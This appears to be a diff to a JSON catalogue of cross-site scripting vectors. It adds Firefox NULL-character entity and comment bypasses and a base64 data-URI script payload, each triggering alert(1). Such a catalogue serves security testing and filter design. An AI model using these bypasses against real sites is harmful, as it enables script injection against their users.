@@ -88,5 +88,36 @@
         "description": "GreyMagic HTML+time exploit (no longer works even in 5 docmode)",
         "code": "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<img src=1 onerror=alert(1)>\"> <\/BODY><\/HTML>",
         "browsers": []
+    },
+    {
+        "description": "Firefox allows NULLS after &",
+        "code": "<a href=\"javascript&\u0000#x6a;avascript:alert(1)\">Firefox<\/a>",
+        "browsers": [
+            "firefox"
+        ]
+    },
+    {
+        "description": "Firefox allows NULLs inside named entities",
+        "code": "<a href=\"javascript&\u0000colon\u0000;alert(1)\">Firefox<\/a>",
+        "browsers": [
+            "firefox"
+        ]
+    },
+    {
+        "description": "Firefox allows NULL characters inside opening comments",
+        "code": "<!-\u0000- ><img title=\"--><iframe\/onload=alert(1)>\"> -->\n<!-\u0000\u0000\u0000\u0000\u0000- ><img title=\"--><iframe\/onload=alert(1)>\"> -->",
+        "browsers": [
+            "firefox"
+        ]
+    },
+    {
+        "description": "Data protocol inside script src with base64",
+        "code": "<script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
     }
 ]
